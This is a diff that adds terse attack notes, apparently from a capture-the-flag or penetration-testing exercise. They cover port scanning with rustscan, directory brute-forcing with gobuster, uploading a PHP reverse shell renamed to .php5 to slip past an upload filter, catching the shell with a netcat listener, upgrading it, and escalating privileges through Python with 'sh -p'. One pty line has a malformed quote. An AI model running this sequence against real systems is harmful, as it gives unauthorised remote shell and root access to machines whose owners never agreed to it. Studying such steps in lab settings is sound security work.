@@ -1,0 +1,20 @@
+# Scan for open ports
+rustscan -a TARGET -u 5000 | tee rustscan.txt
+
+# Check for hidden directories using gobuster
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt TARGET
+
+# Upload https://github.com/pentestmonkey/php-reverse-shell
+# Obfuscate .php with .php5
+
+# Listen with netcat
+nc -nvlp 4444
+
+# Go to uploaded file
+
+# Spawn interactive shell
+python -c "import pty; pty.spawn('/bin/sh'/"
+python -c "import os; os.system('/bin/sh')"
+
+# Escalate privileges using Python
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
